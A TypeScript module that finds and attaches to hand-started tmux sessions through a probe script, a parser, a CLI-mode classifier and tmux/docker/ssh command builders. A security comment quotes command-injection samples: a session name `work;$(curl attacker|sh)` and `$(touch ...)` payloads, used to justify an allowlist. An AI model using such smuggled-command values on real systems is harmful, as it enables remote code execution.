/**
 * @fileoverview Pure core for FOREIGN tmux sessions — the ones a human started
 * by hand, which Codeman neither created nor owns.
 *
 * Everything here is a string in / structure out, so all three locations (local,
 * inside a container, across ssh) go through ONE probe script, ONE parser and ONE
 * classifier. Writing a second copy per location is exactly how the two would
 * drift into disagreeing about what a session is.
 *
 * ## Why the probe script is dumb
 *
 * It runs two commands and prints them: `tmux list-panes` per socket, and one
 * `ps` snapshot. No filtering, no logic. All judgement happens in Node, where it
 * is pure and unit-testable, instead of in a shell string that is embedded three
 * different ways and can only be debugged against a real host.
 *
 * ⚠️ The script MUST NOT contain a single quote. It is wrapped in single quotes
 * to cross `ssh <host> '<script>'` and `docker exec <c> sh -lc '<script>'`. That
 * is the single-quote dual of the "no double quotes in the docker launch chain"
 * rule in `tmux-manager.ts` — same class of bug, opposite quote.
 *
 * ## Why the mode comes from the process tree
 *
 * `#{pane_current_command}` is `node` for BOTH claude and codex, so it cannot
 * distinguish them. The classifier walks the pane's descendants over the `ps`
 * snapshot with `collectDescendants` (bounded: one snapshot, no per-node spawn —
 * see proc-tree.ts for the incident that rule exists for) and matches argv. What
 * it cannot identify is `shell`, which is also the honest answer for the case
 * this feature was built for: a hand-opened shell.
 *
 * ## Why attaching means creating a grouped session
 *
 * A grouped session (`new-session -t <target>`) shares the target's WINDOWS but
 * is its own session, so our `status off` and our current-window selection land
 * on us alone. A bare `attach` would have to set those on the owner's session,
 * i.e. mutate something we do not own. `destroy-unattached on` then makes our
 * view evaporate when the wrapper pane dies (measured: it does).
 *
 * ⚠️ The group session must be created ATTACHED (no `-d`). tmux's
 * `server_check_unattached()` runs every server loop, so a detached session with
 * `destroy-unattached on` is torn down almost immediately — the option has to
 * land on a session that already has our client on it.
 *
 * ⚠️ **Grouping does NOT give us an independent window SIZE, and believing it did
 * was wrong.** Measured on tmux 3.3a against a target held open by a 200x49
 * client, with our client at 80x24:
 *
 *   bare attach                      -> target becomes 80x23
 *   grouped session                  -> target becomes 80x23   (same!)
 *   grouped + `window-size largest`  -> target stays  200x49
 *
 * A window is one object with one size; a group shares the object. So attaching
 * from Codeman resizes a session someone else is actively viewing, exactly like
 * any second tmux client does — that is tmux's normal behavior, and it reverses
 * when we detach.
 *
 * `window-size largest` is deliberately NOT set here. It is a WINDOW option on a
 * SHARED window, so it survives our detach (measured: still `largest` after our
 * view is gone) — it would permanently rewrite the owner's configuration to buy
 * a cropped view for us. Restoring it would need the previous value captured with
 * `$(...)`, and command substitution cannot live in this string: the local branch
 * crosses `bash -c "..."`, where the OUTER shell expands it first. That is the
 * same rule the docker launch chain states as "no command substitution", and the
 * same trap that silently emptied `$TMUX_TMPDIR` while this probe was developed.
 * A user who wants the crop instead of the resize can set `window-size largest`
 * on their own session, which is theirs to set.
 *
 * @module foreign-tmux
 */

import { collectDescendants } from './proc-tree.js';
import { FOREIGN_MAX_PANES, FOREIGN_MAX_PROCS, FOREIGN_MAX_SOCKETS } from './config/foreign-tmux.js';
import type { ForeignPaneProbe, ForeignTmuxLocationKind } from './types/foreign-tmux.js';
import type { SessionMode } from './types/session.js';

// ===========================================================================
// Probe script
// ===========================================================================

/**
 * Field separator. tmux's `-F` does NOT expand a backslash-t escape: it emits the
 * LITERAL two characters (verified on next-3.7 — the same finding that shaped
 * `parseRemoteSessionList` in remote-hosts.ts). The parser accepts a real TAB too,
 * in case some build does expand it.
 */
const SEP = '\\t';
const SEP_SPLIT = /\\t|\t/;
const REJOIN = '\t';

const PANE_MARKER = 'CMFP';
const PROC_MARKER = 'CMFQ';
const SOCKET_MARKER = 'CMFS';

/**
 * The probe, as POSIX sh. NO SINGLE QUOTES (see @fileoverview).
 *
 * Emits, in order:
 *   CMFS<sep><socket path>                        (one per readable socket)
 *   CMFP<sep><socket><sep>...<sep>name<sep>path   (one per pane on that socket)
 *   CMFQ                                          (marker; ps rows follow)
 *   <pid> <ppid> <argv...>
 *
 * The two free-form fields (session name, pane path) are LAST so a separator
 * inside one of them can be re-joined by position instead of corrupting the row.
 */
export function buildForeignProbeScript(): string {
  const fmt = [
    PANE_MARKER,
    '#{socket_path}',
    '#{pane_pid}',
    '#{window_index}',
    '#{session_windows}',
    '#{session_created}',
    '#{session_attached}',
    '#{pane_id}',
    '#{pane_current_command}',
    '#{session_name}',
    '#{pane_current_path}',
  ].join(SEP);

  // `ps -eo` covers procps and macOS; `ps ax -o` is the BSD-ish fallback. If both
  // fail we still emit the pane rows, and classification degrades to the pane
  // command — which still names a plain shell correctly.
  // ⚠️ No `set -f` here: the socket sweep IS a glob, and disabling pathname
  // expansion turns the loop into a single literal non-match. ⚠️ The marker line
  // must NOT try to carry the field separator at all. Measured: `sh`'s builtin
  // `echo` EXPANDS a backslash-t to a real TAB, while tmux's own `-F` emits the
  // two literal characters — so the same escape means two different things two
  // lines apart. The socket line is space-separated instead (marker first, rest
  // of line is the path), which no shell rewrites.
  //
  // Only `$TMUX_TMPDIR/tmux-<uid>/` is swept, which covers every `tmux -L <name>`
  // server (that is exactly where tmux puts them). A socket at an arbitrary
  // `tmux -S /custom/path` is deliberately out of scope: finding it would mean
  // walking the filesystem for sockets.
  return [
    'TD=${TMUX_TMPDIR:-/tmp}',
    'U=$(id -u 2>/dev/null || echo 0)',
    `for S in $TD/tmux-$U/*; do [ -S "$S" ] || continue; echo "${SOCKET_MARKER} $S"; ` +
      `tmux -S "$S" list-panes -a -F "${fmt}" 2>/dev/null; done`,
    `echo ${PROC_MARKER}`,
    'ps -eo pid=,ppid=,args= 2>/dev/null || ps ax -o pid=,ppid=,args= 2>/dev/null || true',
  ].join('; ');
}

// ===========================================================================
// Parsing
// ===========================================================================

export interface ForeignProbeOutput {
  panes: ForeignPaneProbe[];
  /** parent pid to child pids, from the ONE `ps` snapshot (proc-tree input). */
  byParent: Map<number, number[]>;
  /** pid to full argv line. */
  argvByPid: Map<number, string>;
  /** Sockets seen, in scan order (may exceed the pane list when a socket is empty). */
  sockets: string[];
}

/** Parse one probe's stdout. Never throws: a malformed row is skipped, not fatal. */
export function parseForeignProbeOutput(stdout: string): ForeignProbeOutput {
  const panes: ForeignPaneProbe[] = [];
  const sockets: string[] = [];
  const byParent = new Map<number, number[]>();
  const argvByPid = new Map<number, string>();
  if (!stdout) return { panes, byParent, argvByPid, sockets };

  let inProcs = false;
  let procCount = 0;

  for (const raw of stdout.split('\n')) {
    const line = raw.replace(/\r$/, '');
    if (!line) continue;

    if (!inProcs && line === PROC_MARKER) {
      inProcs = true;
      continue;
    }

    if (inProcs) {
      if (procCount >= FOREIGN_MAX_PROCS) continue;
      // `<pid> <ppid> <argv...>` — leading spaces are how `ps -o pid=` pads.
      const m = /^\s*(\d+)\s+(\d+)\s+(.*)$/.exec(line);
      if (!m) continue;
      const pid = Number(m[1]);
      const ppid = Number(m[2]);
      if (!Number.isSafeInteger(pid) || !Number.isSafeInteger(ppid)) continue;
      procCount += 1;
      argvByPid.set(pid, m[3] ?? '');
      const siblings = byParent.get(ppid);
      if (siblings) siblings.push(pid);
      else byParent.set(ppid, [pid]);
      continue;
    }

    if (line.startsWith(`${SOCKET_MARKER} `)) {
      const sock = line.slice(SOCKET_MARKER.length + 1);
      if (sock && sockets.length < FOREIGN_MAX_SOCKETS && !sockets.includes(sock)) sockets.push(sock);
      continue;
    }

    const fields = line.split(SEP_SPLIT);
    if (fields[0] !== PANE_MARKER) continue;
    if (panes.length >= FOREIGN_MAX_PANES) continue;
    // 11 fields: marker + 8 fixed + name + path. A separator inside the NAME
    // pushes extras into the middle, so the path is taken from the END and the
    // name is whatever sits between the fixed prefix and it.
    if (fields.length < 11) continue;

    const panePid = Number(fields[2]);
    const windowIndex = Number(fields[3]);
    const windows = Number(fields[4]);
    const created = Number(fields[5]);
    if (!Number.isSafeInteger(panePid) || panePid <= 0) continue;

    const paneCurrentPath = fields[fields.length - 1] ?? '';
    const sessionName = fields.slice(9, fields.length - 1).join(REJOIN);
    if (!sessionName) continue;

    panes.push({
      socketPath: fields[1] ?? '',
      sessionName,
      windowIndex: Number.isSafeInteger(windowIndex) ? windowIndex : 0,
      paneId: fields[7] ?? '',
      panePid,
      paneCurrentCommand: fields[8] ?? '',
      paneCurrentPath,
      sessionAttached: fields[6] === '1',
      sessionCreated: Number.isSafeInteger(created) && created > 0 ? created : 0,
      windows: Number.isSafeInteger(windows) && windows > 0 ? windows : 1,
    });
  }

  return { panes, byParent, argvByPid, sockets };
}

// ===========================================================================
// Classification
// ===========================================================================

/**
 * argv signatures for the CLIs Codeman knows, most specific first.
 *
 * Matched against the WHOLE argv of a pane descendant, so `node .../bin/claude`
 * hits the claude rule via the path. `dsh` needs a tighter rule than the rest:
 * Debian ships an unrelated `dsh` (distributed shell), which is exactly the trap
 * `deepseek-cli-resolver.ts` guards against with an identity probe.
 */
export const FOREIGN_CLI_SIGNATURES: ReadonlyArray<{ mode: SessionMode; test: RegExp }> = [
  { mode: 'claude', test: /(^|\/)claude(\s|$)|[/\\]\.?claude[/\\][^\s]*cli\.js|[/\\]bin[/\\]claude\b/ },
  { mode: 'codex', test: /(^|\/)codex(\s|$)|[/\\]bin[/\\]codex\b|[/\\]@openai[/\\]codex/ },
  { mode: 'opencode', test: /(^|\/)opencode(\s|$)|[/\\]bin[/\\]opencode\b/ },
  { mode: 'antigravity', test: /(^|\/)agy(\s|$)|[/\\]bin[/\\]agy\b|antigravity/ },
  { mode: 'gemini', test: /(^|\/)gemini(\s|$)|[/\\]bin[/\\]gemini\b/ },
  { mode: 'grok', test: /(^|\/)grok(\s|$)|[/\\]bin[/\\]grok\b/ },
  { mode: 'deepseek', test: /(^|\/)dsh(\s|$)|[/\\]bin[/\\]dsh\b|deepseek[-_]?harness/i },
  { mode: 'pi', test: /(^|\/)pi(\s|$)|[/\\]bin[/\\]pi\b/ },
];

/** Commands that mean "this is a plain shell", not an unidentified agent. */
const SHELL_COMMANDS = new Set([
  'bash',
  'sh',
  'zsh',
  'fish',
  'dash',
  'ksh',
  'tcsh',
  'csh',
  'ash',
  'busybox',
  'login',
  '-bash',
  '-zsh',
  '-sh',
]);

export interface ClassifiedPane {
  mode: SessionMode;
  /** The argv line the decision came from, truncated for display. */
  command: string;
}

const COMMAND_DISPLAY_MAX = 160;

/**
 * Decide what a pane is running.
 *
 * Order matters: the pane's own command is checked against the CLI signatures
 * first (a pane running `claude` directly is unambiguous and needs no walk), then
 * the bounded descendant walk, and only then the shell fallback. The walk is what
 * separates claude from codex, since tmux reports `node` for both.
 */
export function classifyForeignPaneMode(
  pane: Pick<ForeignPaneProbe, 'panePid' | 'paneCurrentCommand'>,
  probe: Pick<ForeignProbeOutput, 'byParent' | 'argvByPid'>
): ClassifiedPane {
  const own = probe.argvByPid.get(pane.panePid) ?? pane.paneCurrentCommand;

  const direct = matchSignature(own);
  if (direct) return { mode: direct, command: truncate(own) };

  const descendants = collectDescendants(pane.panePid, probe.byParent);
  for (const pid of descendants) {
    const argv = probe.argvByPid.get(pid);
    if (!argv) continue;
    const hit = matchSignature(argv);
    if (hit) return { mode: hit, command: truncate(argv) };
  }

  // tmux's own answer is the last signal worth trying: `#{pane_current_command}`
  // is the pane's FOREGROUND process, whereas `pane_pid` is the shell hosting it,
  // so this catches an agent whose process tree was unreadable (no `ps` on the
  // host) or deeper than the walk's cap.
  const fromTmux = matchSignature(pane.paneCurrentCommand);
  if (fromTmux) return { mode: fromTmux, command: truncate(pane.paneCurrentCommand) };

  // Nothing recognised. `shell` is the honest answer AND the primary case this
  // feature exists for; the raw command travels alongside so the UI can show what
  // is actually running rather than asserting a mode it did not verify.
  return { mode: 'shell', command: truncate(own || pane.paneCurrentCommand) };
}

function matchSignature(argv: string): SessionMode | null {
  if (!argv) return null;
  const base = basenameOf(argv);
  if (SHELL_COMMANDS.has(base)) return null;
  for (const sig of FOREIGN_CLI_SIGNATURES) {
    if (sig.test.test(argv)) return sig.mode;
  }
  return null;
}

function basenameOf(argv: string): string {
  const first = argv.trim().split(/\s+/)[0] ?? '';
  const slash = first.lastIndexOf('/');
  return slash >= 0 ? first.slice(slash + 1) : first;
}

function truncate(s: string): string {
  const flat = s.replace(/\s+/g, ' ').trim();
  return flat.length > COMMAND_DISPLAY_MAX ? `${flat.slice(0, COMMAND_DISPLAY_MAX - 1)}...` : flat;
}

// ===========================================================================
// Exclusion — never adopt what Codeman already owns
// ===========================================================================

/** tmux servers Codeman runs itself. Sessions on these are never "foreign". */
const CODEMAN_SOCKET_BASENAMES = new Set(['codeman', 'codeman-remote', 'codeman-docker']);

/** Session names Codeman mints. */
const CODEMAN_SESSION_PREFIXES = ['codeman-', 'claudeman-'];

/**
 * Is this pane one of Codeman's own, at any location?
 *
 * Excluding them is not cosmetic. Locally it stops Codeman from adopting its own
 * sessions (which would attach a second PTY to a live pane). On a remote host or
 * inside a container it stops the SAME session from being reachable through two
 * different code paths — `remote-hosts.listRemoteCodemanSessions` already owns
 * the `tmux -L codeman` case there, and two paths to one session is how the two
 * end up disagreeing about ownership.
 *
 * @param ownSocket this instance's own socket name (`resolveTmuxSocketName()`),
 *                  which is instance-scoped and therefore not a constant.
 */
export function isCodemanOwnedPane(
  pane: Pick<ForeignPaneProbe, 'socketPath' | 'sessionName'>,
  ownSocket: string
): boolean {
  const socketName = basenameOf(pane.socketPath);
  if (socketName === ownSocket) return true;
  if (CODEMAN_SOCKET_BASENAMES.has(socketName)) return true;
  // A `codeman-<instance>` socket belongs to another Codeman instance even when
  // THIS instance runs on a different one.
  if (socketName.startsWith('codeman-')) return true;
  return CODEMAN_SESSION_PREFIXES.some((p) => pane.sessionName.startsWith(p));
}

// ===========================================================================
// Adoptability — what may cross the launch chain at all
// ===========================================================================

/**
 * Characters a foreign session name or socket path may contain to be adoptable.
 *
 * ⚠️ This is a SECURITY GATE, not tidiness, and it is an ALLOWLIST because the
 * blocklist version of it is one forgotten character away from a shell.
 *
 * A foreign session name is chosen by SOMEONE ELSE, and the local launch chain
 * ends at `execSync(`… bash -c ${JSON.stringify(launchCmd)}`)`. `JSON.stringify`
 * escapes `"` and `\` — it does NOT escape `$` or a backtick — and the outer
 * shell parses that string with those still live inside its double quotes. The
 * inner single quotes this module adds do not help: the outer shell substitutes
 * first. Measured directly:
 *
 *   launchCmd = `: 'x$(touch /tmp/PWNED2)`touch /tmp/PWNED3`'`
 *   execSync(`bash -c ${JSON.stringify(launchCmd)}`)  ->  BOTH files created
 *
 * So a session called `work;$(curl attacker|sh)` sitting on the default socket
 * would run as the Codeman server account the moment someone clicked Open. The
 * name never reaches a command at all now: a candidate that fails this test is
 * dropped during discovery, so it has no id, and the adopt endpoint re-resolves
 * through that same discovery and can only 404.
 *
 * Generous on purpose about what real names contain — Unicode letters, digits,
 * marks, spaces, and the punctuation people actually use — because a refusal
 * here is a session the user cannot open at all.
 */
const ADOPTABLE_TEXT = /^[\p{L}\p{N}\p{M} _.+=@#%,~^!/-]+$/u;

/** Same rule, plus the path separator and no `..` climbing. */
export function isAdoptableSocketPath(socketPath: string): boolean {
  if (!socketPath || socketPath.length > 4096) return false;
  if (!socketPath.startsWith('/')) return false;
  if (socketPath.includes('..')) return false;
  return ADOPTABLE_TEXT.test(socketPath);
}

/** True when this session name can cross the launch chain safely. */
export function isAdoptableSessionName(sessionName: string): boolean {
  if (!sessionName || sessionName.length > 256) return false;
  return ADOPTABLE_TEXT.test(sessionName);
}

// ===========================================================================
// Identity
// ===========================================================================

/**
 * Stable, opaque id for a candidate. The browser sends this back to adopt, so it
 * must survive a re-scan (same session gets the same id) without the browser ever
 * handing us a socket path or session name to interpolate into a command.
 */
export function foreignSessionId(
  location: ForeignTmuxLocationKind,
  hostKey: string,
  socketPath: string,
  sessionName: string
): string {
  return `f${fnv1a(`${location} ${hostKey} ${socketPath} ${sessionName}`)}`;
}

function fnv1a(input: string): string {
  let h = 0x811c9dc5;
  for (let i = 0; i < input.length; i += 1) {
    h ^= input.charCodeAt(i);
    h = Math.imul(h, 0x01000193) >>> 0;
  }
  return h.toString(16).padStart(8, '0');
}

/**
 * Our grouped view session's name on the FOREIGN server. Deliberately prefixed
 * `codeman-view-` so a human looking at their own `tmux ls` can see what joined
 * them, and so a second Codeman's discovery excludes it (the `codeman-` prefix
 * rule above).
 */
export function foreignViewSessionName(sessionId: string): string {
  return `codeman-view-${sessionId.slice(0, 8)}`;
}

// ===========================================================================
// Attach command builders
// ===========================================================================

/** Single-quote for POSIX sh. Local copy so this module stays dependency-free. */
export function fshq(str: string): string {
  return `'${String(str).replace(/'/g, `'\\''`)}'`;
}

export interface ForeignAttachTarget {
  socketPath: string;
  targetSession: string;
  viewSession: string;
}

/**
 * The tmux invocation that joins a foreign session, as ONE line of POSIX sh.
 *
 * Shape and why:
 *   tmux -S <sock> new-session -t <target> -s <view> ; set destroy-unattached on ; set status off
 *     || exec tmux -S <sock> attach-session -r -t <target>
 *
 * - `new-session -t` creates a session in the target's GROUP: same windows, our
 *   own session options and current window (NOT our own size — see @fileoverview
 *   for the measurement that disproved that).
 * - `status off` is why grouping earns its keep: it lands on OUR session, so the
 *   owner's status bar is untouched.
 * - No `-d`: the session must be attached before `destroy-unattached` lands on it.
 * - The escaped semicolons reach tmux as plain command separators after one shell
 *   parse — the same convention the docker launch chain uses.
 * - The `||` fallback is a READ-ONLY attach, for a tmux too old to group. It is
 *   read-only on purpose: a writable bare attach would resize the owner's
 *   terminal, which is the one outcome this design exists to prevent. The caller
 *   records it as `SessionAdopt.readOnly` so the UI can say so.
 * - Single line: the string crosses `bash -c "..."`, where a real newline would
 *   not survive JSON escaping.
 */
export function buildForeignTmuxInvocation(target: ForeignAttachTarget): string {
  const sock = fshq(target.socketPath);
  const t = fshq(target.targetSession);
  const v = fshq(target.viewSession);
  const group =
    `tmux -S ${sock} new-session -t ${t} -s ${v} \\; ` +
    `set-option -t ${v} destroy-unattached on \\; ` +
    `set-option -t ${v} status off`;
  const readOnly = `exec tmux -S ${sock} attach-session -r -t ${t}`;
  return `${group} || ${readOnly}`;
}

/** Local adoption: run the invocation directly in the wrapper pane. */
export function buildForeignAttachCommand(target: ForeignAttachTarget): string {
  return buildForeignTmuxInvocation(target);
}

export interface ForeignDockerAttachOptions extends ForeignAttachTarget {
  /** `buildDockerBaseArgs(...)` joined — e.g. `docker` or `docker --context foo`. */
  dockerBase: string;
  containerName: string;
}

/**
 * Docker adoption: `docker exec -it` into the container and attach there.
 *
 * Mirrors the ADOPTED-container branch of `buildDockerLaunchCommand`: look, then
 * exec. Never `create`, never `start` — the container belongs to the user, and a
 * missing or stopped one fails closed with a message instead of being mutated.
 */
export function buildForeignDockerAttachCommand(opts: ForeignDockerAttachOptions): string {
  const name = fshq(opts.containerName);
  const notFound = fshq(
    `Codeman: container ${opts.containerName} not found. Codeman never creates a container it does not own.`
  );
  const notRunning = fshq(
    `Codeman: container ${opts.containerName} is not running. Codeman never starts a container it does not own.`
  );
  const inspect = `${opts.dockerBase} inspect ${name} >/dev/null 2>&1 || { echo ${notFound}; exit 1; }`;
  const running =
    `${opts.dockerBase} inspect -f ${fshq('{{.State.Running}}')} ${name} 2>/dev/null | grep -qx true ` +
    `|| { echo ${notRunning}; exit 1; }`;
  const exec = `exec ${opts.dockerBase} exec -it ${name} sh -lc ${fshq(buildForeignTmuxInvocation(opts))}`;
  return [inspect, running, exec].join(' ; ');
}

/**
 * Tear down OUR grouped view session inside a container.
 *
 * ⚠️ Needed for docker and NOT for the other two, which is a docker fact rather
 * than a design choice. Killing the wrapper pane kills a LOCAL tmux client
 * directly, and over ssh it sends SIGHUP to the remote client (the same
 * propagation the non-owned remote attach has relied on since COD-105) — either
 * way the client detaches and `destroy-unattached on` collects the view.
 * A `docker exec` process does NOT die when its client goes away: measured, the
 * in-container tmux client stayed attached after the wrapper was killed, so the
 * view session survived forever and every adoption leaked one of them plus its
 * exec process.
 *
 * Killing a session by name affects ONLY that session, never the group's other
 * members — so this can only ever remove the view Codeman created, never the
 * human's session it is grouped with. Sibling of `buildDockerKillCommand`, and
 * fired best-effort on the same path.
 */
export function buildForeignDockerViewKillCommand(opts: {
  dockerBase: string;
  containerName: string;
  socketPath: string;
  viewSession: string;
}): string {
  return (
    `${opts.dockerBase} exec ${fshq(opts.containerName)} ` +
    `tmux -S ${fshq(opts.socketPath)} kill-session -t ${fshq(opts.viewSession)}`
  );
}

export interface ForeignRemoteAttachOptions extends ForeignAttachTarget {
  /** `buildSshConnectionArgs(host)` — `['ssh', '-o BatchMode=yes', ...]`. */
  sshArgs: string[];
  /** `remoteSshTarget(host)` — `user@host`. */
  sshTarget: string;
}

/**
 * Remote adoption: ssh in and attach there.
 *
 * `-t` goes right after `ssh -o BatchMode=yes`, exactly where
 * `buildRemoteAttachCommand` puts it — interactive tmux needs a PTY. Connection
 * options come from the shared `buildSshConnectionArgs`, never hand-built here,
 * so adoption reaches a proxied/custom-port host on the same terms discovery did.
 */
export function buildForeignRemoteAttachCommand(opts: ForeignRemoteAttachOptions): string {
  const [ssh, batchMode, ...rest] = opts.sshArgs;
  return [ssh, batchMode, '-t', ...rest, opts.sshTarget, fshq(buildForeignTmuxInvocation(opts))]
    .filter(Boolean)
    .join(' ');
}
